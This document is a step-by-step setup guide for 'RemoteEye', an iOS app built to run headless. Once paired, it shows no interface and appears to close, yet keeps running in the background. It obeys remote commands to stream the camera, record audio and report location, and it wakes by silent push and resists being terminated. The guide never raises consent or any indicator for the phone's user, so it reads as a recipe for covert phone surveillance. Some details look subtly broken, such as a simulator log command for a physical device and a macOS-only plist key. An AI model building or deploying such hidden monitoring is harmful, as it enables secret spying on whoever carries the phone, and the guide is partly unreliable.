# RemoteEye - Headless Mode Setup Guide

This guide explains how to set up the RemoteEye mobile app for headless (UI-less) background operation.

## Overview

The RemoteEye mobile app can run in two modes:

| Mode | Use Case | UI Visible | `isSetupMode` |
|------|----------|------------|---------------|
| **Setup Mode** | Initial device pairing | Yes | `true` |
| **Headless Mode** | Production background operation | No | `false` |

In headless mode, the app runs the React Native JavaScript bundle without displaying any UI. It operates entirely in the background, responding to push notifications and maintaining WebSocket connections.

---

## Prerequisites

Before starting, ensure you have:

1. The RemoteEye server deployed and accessible
2. Firebase Cloud Messaging configured for the iOS app
3. Xcode installed with valid signing certificates
4. A physical iPhone (simulators don't support push notifications properly)

---

## Step 1: Configure Setup Mode

Open `mobile/ios/RemoteEyeMobile/AppDelegate.swift` and locate the `isSetupMode` flag at the top of the file:

```swift
// =============================================================================
// SETUP MODE FLAG
// =============================================================================
// Set to `true` to enable UI for initial device pairing.
// Set to `false` for headless background operation after pairing is complete.
private let isSetupMode = true  // <-- Set to true for initial setup
```

---

## Step 2: Build and Install (Setup Mode)

1. Open the Xcode workspace:
   ```bash
   cd mobile/ios
   open RemoteEyeMobile.xcworkspace
   ```

2. Select your physical iPhone as the build target

3. Build and run the app (Cmd+R)

4. The app will launch with the visible UI showing the **Pairing Screen**

---

## Step 3: Complete Device Pairing

On the Pairing Screen:

1. **Generate Pairing Code**: Tap the "Generate Code" button
   - A 6-character hexadecimal code will be displayed (e.g., `ABC123`)
   - The code expires in 10 minutes

2. **Enter Device Name**: Optionally customize the device name

3. **Register Device**: Tap "Register Device"
   - The app will call `POST /api/auth/register` with the pairing code
   - On success, JWT tokens are stored in AsyncStorage:
     - `TOKEN`: Access token (60-minute expiry)
     - `REFRESH_TOKEN`: Refresh token (7-day expiry)
     - `DEVICE_ID`: Unique device identifier

4. **Verify Connection**: The app transitions to the Main Screen showing:
   - Connection status (green = connected)
   - Device ID
   - Server URL

---

## Step 4: Verify on Dashboard

Before switching to headless mode, confirm the device is working:

1. Open the RemoteEye Dashboard in your browser

2. Enter the same pairing code used on the mobile app

3. The dashboard should show the device as **ONLINE**

4. Test basic commands:
   - Start/stop camera streaming
   - Start/stop audio recording
   - Request location

If everything works, proceed to headless mode.

---

## Step 5: Switch to Headless Mode

1. Open `mobile/ios/RemoteEyeMobile/AppDelegate.swift`

2. Change `isSetupMode` to `false`:
   ```swift
   private let isSetupMode = false  // <-- Headless mode enabled
   ```

3. Rebuild and reinstall the app on the iPhone:
   ```bash
   cd mobile/ios
   xcodebuild -workspace RemoteEyeMobile.xcworkspace \
     -scheme RemoteEyeMobile \
     -destination 'platform=iOS,name=YOUR_IPHONE_NAME' \
     -configuration Release \
     clean build
   ```

4. The app will now:
   - Launch without displaying any UI
   - Automatically load stored credentials from AsyncStorage
   - Connect to the WebSocket server
   - Initialize push notification handling
   - Wait for commands

---

## Step 6: Verify Headless Operation

After installing the headless build:

1. **Launch the app** - You'll briefly see the splash screen, then the app will appear to close (but it's running in the background)

2. **Check Dashboard** - The device should show as ONLINE

3. **Send a command** - Use the dashboard to start camera streaming
   - The device should respond even though no UI is visible

4. **Test wake-up** - Force-quit the app, then send a push notification command
   - The app should wake up and execute the command

---

## How It Works

### AppDelegate Behavior

When `isSetupMode = false`:

```swift
if isSetupMode {
  // Setup Mode: Create window and show UI
  window = UIWindow(frame: UIScreen.main.bounds)
  factory.startReactNative(withModuleName: "RemoteEyeMobile", in: window, ...)
} else {
  // Headless Mode: Just create the bridge, no window
  bridge = RCTBridge(delegate: delegate, launchOptions: launchOptions)
  // No UI will be presented
}
```

### App.tsx Authentication State Machine

On launch, the app checks credentials and decides its behavior:

```
┌─────────────────────────────────────────────────────────────┐
│                      App Launches                            │
└─────────────────────────┬───────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────────┐
│              Check AsyncStorage for credentials              │
│          (TOKEN, REFRESH_TOKEN, DEVICE_ID)                  │
└─────────────────────────┬───────────────────────────────────┘
                          │
            ┌─────────────┴─────────────┐
            │                           │
     Credentials Exist            No Credentials
            │                           │
            ▼                           ▼
┌───────────────────────┐   ┌───────────────────────┐
│   Is Headless Mode?   │   │   Is Headless Mode?   │
└───────────┬───────────┘   └───────────┬───────────┘
            │                           │
     ┌──────┴──────┐             ┌──────┴──────┐
     │             │             │             │
    Yes           No            Yes           No
     │             │             │             │
     ▼             ▼             ▼             ▼
┌─────────┐  ┌─────────┐  ┌─────────┐  ┌─────────┐
│ Start   │  │ Start   │  │ Log     │  │ Show    │
│Services │  │Services │  │ Error   │  │Pairing  │
│Return   │  │Show     │  │ Idle    │  │ Screen  │
│ null    │  │MainScrn │  │         │  │         │
└─────────┘  └─────────┘  └─────────┘  └─────────┘
```

### Self-Healing Token Refresh

The SocketService automatically handles expired tokens:

```
┌──────────────────────────────────────────────────────────────┐
│              connectWithAutoRefresh()                         │
└───────────────────────────┬──────────────────────────────────┘
                            │
                            ▼
┌──────────────────────────────────────────────────────────────┐
│           Load credentials from AsyncStorage                  │
└───────────────────────────┬──────────────────────────────────┘
                            │
                            ▼
┌──────────────────────────────────────────────────────────────┐
│            Attempt WebSocket connection                       │
└───────────────────────────┬──────────────────────────────────┘
                            │
              ┌─────────────┴─────────────┐
              │                           │
         Success                    401 Error
              │                           │
              ▼                           ▼
┌───────────────────┐        ┌───────────────────────────────┐
│    Connected!     │        │  Refresh token via            │
│  Start heartbeat  │        │  POST /api/auth/refresh       │
└───────────────────┘        └───────────────┬───────────────┘
                                             │
                               ┌─────────────┴─────────────┐
                               │                           │
                          Success                     Failure
                               │                           │
                               ▼                           ▼
                    ┌───────────────────┐    ┌───────────────────┐
                    │  Store new tokens │    │  Clear all creds  │
                    │  Retry connection │    │  Emit authError   │
                    └───────────────────┘    │  Wait for setup   │
                                             └───────────────────┘
```

---

## Troubleshooting

### Device shows OFFLINE after headless install

1. Check that credentials were saved during setup mode
2. Look at device logs: `xcrun simctl log stream --predicate 'senderImagePath CONTAINS "RemoteEyeMobile"'`
3. Verify server is accessible from the device

### Push notifications not waking the app

1. Ensure `content-available: 1` is in the push payload
2. Verify APNs certificate is valid and not expired
3. Check that background modes are enabled in Info.plist:
   - `fetch`
   - `remote-notification`
   - `processing`

### Token refresh keeps failing

1. The refresh token may have expired (7-day lifetime)
2. Solution: Re-enter setup mode and pair again
3. Change `isSetupMode = true`, rebuild, pair, then switch back

### App gets terminated by iOS

iOS may terminate background apps to reclaim resources. To maximize survival:

1. Keep the app doing meaningful work (location updates, audio session)
2. Use Background App Refresh
3. Rely on push notifications to wake the app on-demand

---

## Security Considerations

1. **Credentials are stored in AsyncStorage** - Consider using Keychain for production
2. **Tokens have limited lifetime** - Access: 60 min, Refresh: 7 days
3. **Pairing codes are one-time use** - Cannot be reused after device registration
4. **WebSocket connections are authenticated** - JWT required in handshake

---

## Re-Pairing a Device

If you need to pair the device again (new server, lost credentials, etc.):

1. Set `isSetupMode = true` in AppDelegate.swift
2. Rebuild and install
3. On the Main Screen, tap "Logout" to clear stored credentials
4. Complete the pairing flow again
5. Set `isSetupMode = false` and rebuild

---

## Files Modified for Headless Mode

| File | Changes |
|------|---------|
| `AppDelegate.swift` | Added `isSetupMode` flag, conditional UI/headless initialization |
| `Info.plist` | Added `LSUIElement = true` for agent app behavior |
| `App.tsx` | Authentication state machine, headless detection |
| `SocketService.ts` | `connectWithAutoRefresh()` with self-healing token refresh |
| `PushNotificationService.ts` | Uses self-healing connection for wake-up |
